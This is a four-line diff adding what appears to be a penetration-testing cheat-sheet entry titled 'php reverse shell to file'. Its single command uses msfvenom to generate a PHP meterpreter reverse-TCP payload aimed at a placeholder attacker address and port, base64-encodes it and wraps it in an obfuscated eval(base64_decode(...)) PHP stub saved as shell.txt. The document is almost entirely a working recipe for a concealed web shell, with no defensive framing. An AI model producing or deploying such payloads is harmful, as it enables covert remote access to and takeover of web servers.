@@ -1,0 +1,4 @@
+// php reverse shell to file
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST=IPADDRESS LPORT=PORT -f raw | base64 | tr -d "\r\n" | tr -d "=" | sed -e 's/^/<?php eval(base64_decode(\"/' | awk 'NF{print $0 "\")); ?>"}' > shell.txt
+thanks to DotDotSlash
